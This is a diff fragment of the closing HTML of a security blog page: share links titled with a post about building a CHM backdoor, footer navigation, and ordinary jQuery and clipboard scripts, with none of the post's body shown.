+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://mysecroad.github.io/posts/13577.html&title=构造无痕CHM后门" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://mysecroad.github.io/posts/13577.html&title=构造无痕CHM后门" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://mysecroad.github.io/posts/13577.html&name=构造无痕CHM后门&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://mysecroad.github.io/posts/13577.html&t=构造无痕CHM后门" target="_blank" rel="noopener"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2020
+    ca5tle
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/images/">Img</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="http://github.com/mysecroad" target="_blank" rel="noopener">Projects</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
